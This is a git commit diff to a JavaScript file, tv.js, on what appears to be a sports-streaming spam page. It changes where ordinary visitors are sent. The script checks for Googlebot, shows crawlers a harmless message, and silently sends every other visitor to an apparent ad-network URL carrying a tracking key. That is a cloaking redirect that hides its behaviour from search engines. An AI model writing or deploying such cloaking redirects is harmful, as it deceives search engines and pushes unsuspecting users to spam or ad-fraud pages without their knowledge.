950c972ef582bd946041106edccc6aacb7445800
channeltoday <o.nlinechanneltoday@gmail.com>
2026-08-26 02:38:30 +0600

    Change redirect URL for non-crawler users

--- tv.js
+++ tv.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://daily-livegamewatch.blogspot.com/2026/08/watch-live-efl-cup-round-2-football-on.html";
+  window.location.href = "https://www.profitableratecpmnetwork.com/mwwvd0gmy?key=0f1ae38904cb127d86c661772c29a5e8";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
